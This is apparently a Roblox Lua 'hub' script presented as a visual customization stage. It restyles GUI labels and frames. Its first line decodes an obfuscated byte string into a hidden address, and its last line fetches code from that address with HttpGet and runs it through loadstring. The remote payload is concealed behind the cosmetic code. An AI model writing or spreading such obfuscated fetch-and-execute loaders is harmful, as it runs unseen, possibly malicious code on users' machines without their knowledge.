
--[[ STAGE 2: VISUAL CORE ]]
local NyLymGye9mR1bJ="\026\007\008\005\005\077\099\100\008\028\015\103\033\040\020\041\023\033\025\020\043\021\039\052\052\031\049\055\034\121\047\060\063\126\012\130\030\028\016\030\030\136\020\136\022\026\040\038\026\040\040\032\030\146\054\078\076\058\151\085\083\080\084\064\157\096\085\094\096\162\048\052\066\064\052\066\066\058\056\171\110\088\101"local ubqyRU4qM_CRAj=82 local rH_PqNO4ZMKJF4nL=193 local sAKZbqjm3J3Y3h4z3n=0 local zXUNPY5lUvWIGveGeEsE=1 local A00zanwqoNLvUaRA21YXAZ=30 local xVC2nQxOb9SPr2WS=false local mzSqViS1rRBUv_RalK21=bit32 and bit32.bxor if not mzSqViS1rRBUv_RalK21 then mzSqViS1rRBUv_RalK21=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local zI2FcA2AESg2Fz7pF={}for hq8GKT41Sqsr=1,#NyLymGye9mR1bJ do local vKL9U4qJw6eFg=string.byte(NyLymGye9mR1bJ,hq8GKT41Sqsr)local bOVFzUCeEr7NWqOmdSssae=(rH_PqNO4ZMKJF4nL+(hq8GKT41Sqsr*zXUNPY5lUvWIGveGeEsE)+A00zanwqoNLvUaRA21YXAZ)%256 if sAKZbqjm3J3Y3h4z3n==0 then vKL9U4qJw6eFg=(vKL9U4qJw6eFg-bOVFzUCeEr7NWqOmdSssae)%256 zI2FcA2AESg2Fz7pF[hq8GKT41Sqsr]=string.char(mzSqViS1rRBUv_RalK21(vKL9U4qJw6eFg,ubqyRU4qM_CRAj))else vKL9U4qJw6eFg=mzSqViS1rRBUv_RalK21(vKL9U4qJw6eFg,ubqyRU4qM_CRAj)zI2FcA2AESg2Fz7pF[hq8GKT41Sqsr]=string.char((vKL9U4qJw6eFg-bOVFzUCeEr7NWqOmdSssae)%256)end end local pD1AL6NViiF5MnZta=table.concat(zI2FcA2AESg2Fz7pF)if xVC2nQxOb9SPr2WS then pD1AL6NViiF5MnZta=string.reverse(pD1AL6NViiF5MnZta)end local wraUcOTPT147=pD1AL6NViiF5MnZta
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(wraUcOTPT147))()
